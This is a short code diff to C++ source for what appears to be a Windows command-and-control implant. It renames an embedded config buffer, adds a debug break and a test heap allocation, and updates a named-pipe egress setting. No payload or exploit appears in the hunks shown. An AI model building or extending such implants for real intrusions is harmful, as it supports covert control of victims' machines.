@@ -7,13 +7,14 @@ VOID Entrypoint(HMODULE Base) {
 }
 
 namespace Implant {
-    TXT_SECTION(F) BYTE ConfigBytes[1024] = {
+    TXT_SECTION(F) BYTE Config[1024] = {
         0xDE,0xAD,0xBE,0xEF, 0xDE,0xAD,0xBE,0xEF,
     };
 
     VOID MainRoutine() {
         HEXANE
 
+        __debugbreak();
         Memory::ResolveApi();
         if (ntstatus != ERROR_SUCCESS) {
             return_defer(ntstatus);
@@ -58,8 +59,11 @@ namespace Implant {
         HEXANE
 
         PARSER Parser = { };
-        Parser::CreateParser(&Parser, ConfigBytes, sizeof(ConfigBytes));
-        x_memset(ConfigBytes, 0, sizeof(ConfigBytes));
+        Parser::CreateParser(&Parser, Config, sizeof(Config));
+        x_memset(Config, 0, sizeof(Config));
+
+        LPVOID test = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(BYTE));
+        Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, test);
 
         BYTE pLE    = Parser::UnpackByte(&Parser);
         BYTE pRoot  = Parser::UnpackByte(&Parser);
@@ -161,7 +165,7 @@ namespace Implant {
         }
 #endif
 #ifdef TRANSPORT_PIPE
-        Parser::ParserWcscpy(&Parser, &Ctx->ConfigBytes.EgressPipename, nullptr);
+        Parser::ParserWcscpy(&Parser, &Ctx->Config.EgressPipename, nullptr);
 #endif
     defer:
         Parser::DestroyParser(&Parser);
